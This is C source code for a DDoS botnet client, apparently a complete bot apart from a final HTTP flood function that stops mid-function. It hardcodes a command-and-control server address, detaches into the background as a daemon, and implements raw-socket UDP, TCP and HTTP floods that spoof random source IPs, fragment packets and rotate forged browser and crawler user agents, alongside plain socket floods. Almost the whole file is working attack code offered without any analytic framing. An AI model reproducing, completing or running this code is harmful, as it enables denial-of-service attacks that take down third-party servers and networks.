#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <fcntl.h>
#include <math.h>
#include <stdint.h>
#include <zlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <netdb.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <sys/utsname.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>

#define BUFFER_SIZE 4096
#define CNC_IP "45.134.39.212"
#define CNC_PORT 4087
#define MAX_PACKET 65535
#define MAX_THREADS 500
#define DEFAULT_THREADS 100
#define DEFAULT_SIZE 1400
#define DEFAULT_PPS 100000
#define DEFAULT_DELAY 1
#define SOCKETS_PER_THREAD 4

static int sock = -1;
static int running = 1;
static char arch[64] = "unknown";
static char version[16] = "1.0";
static int is_root = 0;

typedef struct {
    char target[64];
    int port;
    int duration;
    int packet_size;
    int thread_id;
    int threads;
    int pps;
    int delay;
    int use_raw;
    char host[128];
    char path[256];
    int attack_running;
    pthread_t attack_thread;
} attack_args_t;

static attack_args_t current_attack = {0};
volatile int attack_running = 0;
volatile unsigned long long packets_sent = 0;
volatile unsigned long long bytes_sent = 0;
pthread_mutex_t attack_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t sock_mutex = PTHREAD_MUTEX_INITIALIZER;

const char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5.3206.63",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; Facebookbot/1.0; +http://www.facebook.com/facebookbot)",
    "Mozilla/5.0 (compatible; Twitterbot/1.0; +http://twitter.com/help/crawling)",
    "Mozilla/5.0 (compatible; Applebot/1.0; +http://www.apple.com/go/applebot)",
    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot)",
    "Mozilla/5.0 (compatible; SemrushBot/1.0; +http://www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
};

#define NUM_USER_AGENTS (sizeof(user_agents) / sizeof(user_agents[0]))

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    if (setsid() < 0) exit(EXIT_FAILURE);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    umask(0);
    chdir("/");
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    open("/dev/null", O_RDWR);
    dup(0);
    dup(0);
}

void get_arch() {
    struct utsname uname_data;
    if (uname(&uname_data) == 0) {
        snprintf(arch, sizeof(arch), "%s_%s", uname_data.machine, uname_data.sysname);
    } else {
        strcpy(arch, "linux_x86_64");
    }
}

void check_root() {
    if (geteuid() == 0) {
        is_root = 1;
    } else {
        is_root = 0;
    }
}

unsigned short checksum(unsigned short *buffer, int size) {
    unsigned long sum = 0;
    while (size > 1) {
        sum += *buffer++;
        size -= 2;
    }
    if (size == 1) {
        sum += *(unsigned char *)buffer;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

unsigned short tcp_checksum(struct tcphdr *tcp, int tcp_len, uint32_t saddr, uint32_t daddr) {
    uint32_t sum = 0;
    struct pseudo_header {
        uint32_t source_address;
        uint32_t dest_address;
        uint8_t placeholder;
        uint8_t protocol;
        uint16_t tcp_length;
    } pseudo;
    
    pseudo.source_address = saddr;
    pseudo.dest_address = daddr;
    pseudo.placeholder = 0;
    pseudo.protocol = IPPROTO_TCP;
    pseudo.tcp_length = htons(tcp_len);
    
    uint16_t *pseudo_ptr = (uint16_t *)&pseudo;
    uint16_t *tcp_ptr = (uint16_t *)tcp;
    
    for (int i = 0; i < sizeof(pseudo) / 2; i++) {
        sum += pseudo_ptr[i];
    }
    
    for (int i = 0; i < tcp_len / 2; i++) {
        sum += tcp_ptr[i];
    }
    
    if (tcp_len % 2 != 0) {
        sum += ((uint8_t *)tcp)[tcp_len - 1] << 8;
    }
    
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    return (unsigned short)(~sum);
}

void random_payload(unsigned char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = rand() & 0xFF;
    }
}

uint32_t random_ip() {
    uint32_t ip;
    do {
        ip = (rand() & 0xFF) << 24 |
             (rand() & 0xFF) << 16 |
             (rand() & 0xFF) << 8 |
             (rand() & 0xFF);
    } while (ip == 0x0100007F || ip == 0x0A000000 || ip == 0xAC100000 || ip == 0xC0A80000);
    return ip;
}

uint32_t random_ip_by_country() {
    uint32_t ip;
    int country = rand() % 5;
    switch(country) {
        case 0: ip = 0x8E000000 | (rand() & 0x00FFFFFF); break;
        case 1: ip = 0x2D000000 | (rand() & 0x00FFFFFF); break;
        case 2: ip = 0x4A000000 | (rand() & 0x00FFFFFF); break;
        case 3: ip = 0x5B000000 | (rand() & 0x00FFFFFF); break;
        default: ip = random_ip();
    }
    return ip;
}

void random_fragment(char *buffer, int *size, int mtu) {
    int fragment_size = (rand() % (mtu - 40)) + 100;
    if (fragment_size > *size) fragment_size = *size;
    *size = fragment_size;
}

void build_http_request(char *buffer, char *host, char *path, int size, int ua_index) {
    int r1 = rand() % 255, r2 = rand() % 255, r3 = rand() % 255, r4 = rand() % 255;
    int r5 = rand() % 255, r6 = rand() % 255, r7 = rand() % 255, r8 = rand() % 255;
    int r9 = rand() % 255, r10 = rand() % 255, r11 = rand() % 255, r12 = rand() % 255;
    
    int random_method = rand() % 4;
    char *method;
    switch(random_method) {
        case 0: method = "GET"; break;
        case 1: method = "POST"; break;
        case 2: method = "HEAD"; break;
        case 3: method = "PUT"; break;
        default: method = "GET";
    }
    
    char random_path[512];
    if (strlen(path) > 1 && path[0] == '/') {
        strcpy(random_path, path);
    } else {
        snprintf(random_path, sizeof(random_path), "/%s", path);
    }
    
    char random_query[128];
    if (rand() % 2 == 0) {
        snprintf(random_query, sizeof(random_query), "?%d=%d&%d=%d&%d=%d", 
                 rand() % 1000, rand() % 1000,
                 rand() % 1000, rand() % 1000,
                 rand() % 1000, rand() % 1000);
    } else {
        random_query[0] = '\0';
    }
    
    snprintf(buffer, size,
        "%s %s%s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Accept-Encoding: gzip, deflate, br, zstd\r\n"
        "Connection: keep-alive\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "Cache-Control: no-cache, no-store, must-revalidate\r\n"
        "Pragma: no-cache\r\n"
        "X-Forwarded-For: %d.%d.%d.%d\r\n"
        "X-Real-IP: %d.%d.%d.%d\r\n"
        "X-Client-IP: %d.%d.%d.%d\r\n"
        "X-Originating-IP: %d.%d.%d.%d\r\n"
        "Referer: http://%s/\r\n"
        "Sec-Fetch-Dest: document\r\n"
        "Sec-Fetch-Mode: navigate\r\n"
        "Sec-Fetch-Site: none\r\n"
        "Sec-Fetch-User: ?1\r\n"
        "%s"
        "\r\n",
        method, random_path, random_query, host, user_agents[ua_index % NUM_USER_AGENTS],
        r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12,
        r1, r2, r3, r4,
        host,
        (rand() % 2 == 0) ? "Content-Length: 0\r\n" : ""
    );
}

void build_http_post_request(char *buffer, char *host, char *path, int size, int ua_index) {
    char post_data[1024];
    int post_len = rand() % 512 + 64;
    for (int i = 0; i < post_len; i++) {
        post_data[i] = (rand() % 94) + 33;
    }
    post_data[post_len] = '\0';
    
    int r1 = rand() % 255, r2 = rand() % 255, r3 = rand() % 255, r4 = rand() % 255;
    int r5 = rand() % 255, r6 = rand() % 255, r7 = rand() % 255, r8 = rand() % 255;
    
    char random_path[512];
    if (strlen(path) > 1 && path[0] == '/') {
        strcpy(random_path, path);
    } else {
        snprintf(random_path, sizeof(random_path), "/%s", path);
    }
    
    snprintf(buffer, size,
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Connection: keep-alive\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %d\r\n"
        "Cache-Control: no-cache\r\n"
        "X-Forwarded-For: %d.%d.%d.%d\r\n"
        "X-Real-IP: %d.%d.%d.%d\r\n"
        "Referer: http://%s/\r\n"
        "\r\n"
        "%s",
        random_path, host, user_agents[ua_index % NUM_USER_AGENTS],
        post_len, r1, r2, r3, r4, r5, r6, r7, r8,
        host, post_data
    );
}

void send_to_cnc(const char *msg) {
    pthread_mutex_lock(&sock_mutex);
    if (sock > 0) {
        send(sock, msg, strlen(msg), 0);
    }
    pthread_mutex_unlock(&sock_mutex);
}

void *udp_bypass_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd[SOCKETS_PER_THREAD];
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct udphdr *udp_header;
    unsigned char *payload;
    int packet_size;
    time_t end_time;
    int error_count = 0;
    int fragment = 0;
    int should_stop = 0;

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        sockfd[i] = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sockfd[i] < 0) {
            for (int j = 0; j < i; j++) close(sockfd[j]);
            free(args);
            return NULL;
        }
        int one = 1;
        setsockopt(sockfd[i], IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        int bufsize = 1024 * 1024 * 16;
        setsockopt(sockfd[i], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
        
        int ttl = rand() % 128 + 64;
        setsockopt(sockfd[i], IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));
    }

    memset(packet, 0, MAX_PACKET);
    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + args->packet_size;

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    end_time = time(NULL) + args->duration;
    int sent_count = 0;

    while (!should_stop && time(NULL) < end_time) {
        pthread_mutex_lock(&attack_mutex);
        if (!attack_running) {
            should_stop = 1;
            pthread_mutex_unlock(&attack_mutex);
            break;
        }
        pthread_mutex_unlock(&attack_mutex);

        ip_header = (struct iphdr *)packet;
        udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
        payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));

        uint32_t saddr = random_ip_by_country();
        uint32_t daddr = target_addr.sin_addr.s_addr;
        
        int current_size = packet_size;
        
        if (rand() % 5 == 0 && current_size > 200) {
            random_fragment(packet, &current_size, 1500);
            ip_header->frag_off = htons(rand() & 0x1FFF);
            if (rand() % 2 == 0) {
                ip_header->frag_off |= htons(0x2000);
            }
            fragment = 1;
        } else {
            ip_header->frag_off = 0;
            fragment = 0;
        }

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = rand() & 0xFF;
        ip_header->tot_len = htons(current_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->ttl = rand() % 128 + 64;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->check = 0;
        ip_header->saddr = saddr;
        ip_header->daddr = daddr;

        udp_header->source = htons(1024 + (rand() % 64511));
        udp_header->dest = htons(args->port);
        udp_header->len = htons(sizeof(struct udphdr) + args->packet_size);
        udp_header->check = 0;

        random_payload(payload, args->packet_size);
        
        if (rand() % 3 == 0) {
            int offset = rand() % (args->packet_size - 8);
            payload[offset] = 0x00;
            payload[offset+1] = 0x00;
            payload[offset+2] = 0x00;
            payload[offset+3] = 0x00;
        }

        for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
            int result = sendto(sockfd[i], packet, current_size, 0,
                               (struct sockaddr *)&target_addr, sizeof(target_addr));
            
            if (result > 0) {
                packets_sent++;
                bytes_sent += result;
                sent_count++;
            } else {
                error_count++;
                if (errno == EPERM || errno == EACCES) {
                    break;
                }
            }
        }

        if (rand() % 4 == 0 && fragment) {
            struct iphdr *second_frag = (struct iphdr *)packet;
            second_frag->id = ip_header->id;
            second_frag->frag_off = htons((rand() & 0x1FFF) | 0x2000);
            second_frag->tot_len = htons(rand() % 200 + 100);
            for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
                sendto(sockfd[i], packet, ntohs(second_frag->tot_len), 0,
                       (struct sockaddr *)&target_addr, sizeof(target_addr));
                packets_sent++;
            }
        }
    }

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        close(sockfd[i]);
    }
    free(args);
    return NULL;
}

void *tcp_bypass_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd[SOCKETS_PER_THREAD];
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    int packet_size;
    time_t end_time;
    int error_count = 0;
    int flags[] = {TH_SYN, TH_ACK, TH_FIN, TH_RST, TH_SYN|TH_ACK, TH_ACK|TH_FIN, TH_SYN|TH_FIN};
    int num_flags = sizeof(flags) / sizeof(flags[0]);
    int should_stop = 0;

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        sockfd[i] = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sockfd[i] < 0) {
            for (int j = 0; j < i; j++) close(sockfd[j]);
            free(args);
            return NULL;
        }
        int one = 1;
        setsockopt(sockfd[i], IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        int bufsize = 1024 * 1024 * 16;
        setsockopt(sockfd[i], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
        
        int ttl = rand() % 128 + 64;
        setsockopt(sockfd[i], IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));
    }

    memset(packet, 0, MAX_PACKET);
    packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    end_time = time(NULL) + args->duration;
    int sent_count = 0;

    while (!should_stop && time(NULL) < end_time) {
        pthread_mutex_lock(&attack_mutex);
        if (!attack_running) {
            should_stop = 1;
            pthread_mutex_unlock(&attack_mutex);
            break;
        }
        pthread_mutex_unlock(&attack_mutex);

        ip_header = (struct iphdr *)packet;
        tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));

        uint32_t saddr = random_ip_by_country();
        uint32_t daddr = target_addr.sin_addr.s_addr;
        
        int current_size = packet_size;
        
        if (rand() % 5 == 0) {
            ip_header->frag_off = htons(rand() & 0x1FFF);
            if (rand() % 2 == 0) {
                ip_header->frag_off |= htons(0x2000);
            }
        } else {
            ip_header->frag_off = 0;
        }
        
        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = rand() & 0xFF;
        ip_header->tot_len = htons(current_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->ttl = rand() % 128 + 64;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;
        ip_header->saddr = saddr;
        ip_header->daddr = daddr;

        tcp_header->source = htons(1024 + (rand() % 64511));
        tcp_header->dest = htons(args->port);
        tcp_header->seq = rand();
        tcp_header->ack_seq = rand();
        tcp_header->doff = 5;
        tcp_header->syn = 0;
        tcp_header->ack = 0;
        tcp_header->fin = 0;
        tcp_header->rst = 0;
        tcp_header->psh = 0;
        
        int flag_index = rand() % num_flags;
        if (flags[flag_index] & TH_SYN) tcp_header->syn = 1;
        if (flags[flag_index] & TH_ACK) tcp_header->ack = 1;
        if (flags[flag_index] & TH_FIN) tcp_header->fin = 1;
        if (flags[flag_index] & TH_RST) tcp_header->rst = 1;
        
        tcp_header->window = htons(1024 + (rand() % 64511));
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;

        if (rand() % 3 == 0) {
            tcp_header->window = 0;
        }
        
        if (rand() % 4 == 0) {
            tcp_header->doff = 8;
            tcp_header->ack_seq = 0;
        }

        tcp_header->check = tcp_checksum(tcp_header, sizeof(struct tcphdr), saddr, daddr);
        ip_header->check = checksum((unsigned short *)packet, current_size);

        for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
            int result = sendto(sockfd[i], packet, current_size, 0,
                               (struct sockaddr *)&target_addr, sizeof(target_addr));
            
            if (result > 0) {
                packets_sent++;
                bytes_sent += result;
                sent_count++;
            } else {
                error_count++;
                if (errno == EPERM || errno == EACCES) {
                    break;
                }
            }
        }

        if (rand() % 3 == 0) {
            tcp_header->syn = 0;
            tcp_header->ack = 1;
            tcp_header->fin = 1;
            tcp_header->seq = rand();
            tcp_header->ack_seq = rand();
            tcp_header->check = tcp_checksum(tcp_header, sizeof(struct tcphdr), saddr, daddr);
            ip_header->id = htons(rand() & 0xFFFF);
            ip_header->check = checksum((unsigned short *)packet, current_size);
            for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
                sendto(sockfd[i], packet, current_size, 0,
                       (struct sockaddr *)&target_addr, sizeof(target_addr));
                packets_sent++;
            }
        }
    }

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        close(sockfd[i]);
    }
    free(args);
    return NULL;
}

void *http_bypass_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd[SOCKETS_PER_THREAD];
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    char *payload;
    int packet_size;
    time_t end_time;
    char http_request[4096];
    int ua_counter = rand() % NUM_USER_AGENTS;
    int error_count = 0;
    int use_post = 0;
    int should_stop = 0;

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        sockfd[i] = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sockfd[i] < 0) {
            for (int j = 0; j < i; j++) close(sockfd[j]);
            free(args);
            return NULL;
        }
        int one = 1;
        setsockopt(sockfd[i], IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        int bufsize = 1024 * 1024 * 16;
        setsockopt(sockfd[i], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
        
        int ttl = rand() % 128 + 64;
        setsockopt(sockfd[i], IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));
    }

    memset(packet, 0, MAX_PACKET);

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    end_time = time(NULL) + args->duration;
    int sent_count = 0;

    while (!should_stop && time(NULL) < end_time) {
        pthread_mutex_lock(&attack_mutex);
        if (!attack_running) {
            should_stop = 1;
            pthread_mutex_unlock(&attack_mutex);
            break;
        }
        pthread_mutex_unlock(&attack_mutex);

        use_post = (rand() % 3 == 0);
        
        if (use_post) {
            build_http_post_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
        } else {
            build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
        }
        
        int http_len = strlen(http_request);
        
        packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + http_len;
        
        if (packet_size > MAX_PACKET) {
            packet_size = MAX_PACKET;
            http_len = packet_size - sizeof(struct iphdr) - sizeof(struct tcphdr);
        }
        
        ip_header = (struct iphdr *)packet;
        tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
        payload = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr));

        uint32_t saddr = random_ip_by_country();
        uint32_t daddr = target_addr.sin_addr.s_addr;
        
        if (rand() % 5 == 0) {
            ip_header->frag_off = htons(rand() & 0x1FFF);
            if (rand() % 2 == 0) {
                ip_header->frag_off |= htons(0x2000);
            }
        } else {
            ip_header->frag_off = 0;
        }
        
        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = rand() & 0xFF;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->ttl = rand() % 128 + 64;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;
        ip_header->saddr = saddr;
        ip_header->daddr = daddr;

        tcp_header->source = htons(1024 + (rand() % 64511));
        tcp_header->dest = htons(args->port);
        tcp_header->seq = rand();
        tcp_header->ack_seq = rand();
        tcp_header->doff = 5;
        tcp_header->syn = 1;
        tcp_header->ack = 0;
        tcp_header->fin = 0;
        tcp_header->rst = 0;
        tcp_header->psh = 1;
        tcp_header->window = htons(65535);
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;

        if (rand() % 4 == 0) {
            tcp_header->doff = 8;
            tcp_header->window = htons(1024 + (rand() % 1024));
        }

        memcpy(payload, http_request, http_len);
        tcp_header->check = tcp_checksum(tcp_header, sizeof(struct tcphdr) + http_len, saddr, daddr);
        ip_header->check = checksum((unsigned short *)packet, packet_size);

        for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
            int result = sendto(sockfd[i], packet, packet_size, 0,
                               (struct sockaddr *)&target_addr, sizeof(target_addr));
            
            if (result > 0) {
                packets_sent++;
                bytes_sent += result;
                sent_count++;
            } else {
                error_count++;
                if (errno == EPERM || errno == EACCES) {
                    break;
                }
            }
        }
    }

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        close(sockfd[i]);
    }
    free(args);
    return NULL;
}

void *udp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd[SOCKETS_PER_THREAD];
    struct sockaddr_in target_addr;
    char packet[MAX_PACKET];
    int packet_size;
    time_t end_time;
    int should_stop = 0;

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        sockfd[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (sockfd[i] < 0) {
            for (int j = 0; j < i; j++) close(sockfd[j]);
            free(args);
            return NULL;
        }
        int bufsize = 1024 * 1024 * 16;
        setsockopt(sockfd[i], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    }

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    packet_size = args->packet_size;
    if (packet_size > 65507) packet_size = 65507;
    if (packet_size < 64) packet_size = 64;

    end_time = time(NULL) + args->duration;
    int sent_count = 0;

    while (!should_stop && time(NULL) < end_time) {
        pthread_mutex_lock(&attack_mutex);
        if (!attack_running) {
            should_stop = 1;
            pthread_mutex_unlock(&attack_mutex);
            break;
        }
        pthread_mutex_unlock(&attack_mutex);

        random_payload((unsigned char *)packet, packet_size);
        
        for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
            int result = sendto(sockfd[i], packet, packet_size, 0,
                               (struct sockaddr *)&target_addr, sizeof(target_addr));
            
            if (result > 0) {
                packets_sent++;
                bytes_sent += result;
                sent_count++;
            }
        }
    }

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        close(sockfd[i]);
    }
    free(args);
    return NULL;
}

void *tcp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    struct sockaddr_in target_addr;
    char packet[MAX_PACKET];
    int packet_size;
    time_t end_time;
    int sent_count = 0;
    int should_stop = 0;

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    packet_size = args->packet_size;
    if (packet_size > 65535) packet_size = 65535;
    if (packet_size < 64) packet_size = 64;

    end_time = time(NULL) + args->duration;

    while (!should_stop && time(NULL) < end_time) {
        pthread_mutex_lock(&attack_mutex);
        if (!attack_running) {
            should_stop = 1;
            pthread_mutex_unlock(&attack_mutex);
            break;
        }
        pthread_mutex_unlock(&attack_mutex);

        int conn = socket(AF_INET, SOCK_STREAM, 0);
        if (conn >= 0) {
            int bufsize = 1024 * 1024 * 16;
            setsockopt(conn, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
            fcntl(conn, F_SETFL, O_NONBLOCK);
            connect(conn, (struct sockaddr *)&target_addr, sizeof(target_addr));
            random_payload((unsigned char *)packet, packet_size);
            send(conn, packet, packet_size, 0);
            close(conn);
            packets_sent++;
            bytes_sent += packet_size;
            sent_count++;
        }
    }

    free(args);
    return NULL;
}

void *http_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    struct sockaddr_in target_addr;
    char http_request[4096];
    int ua_counter = rand() % NUM_USER_AGENTS;
    time_t end_time;
    int sent_count = 0;
    int should_stop = 0;

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
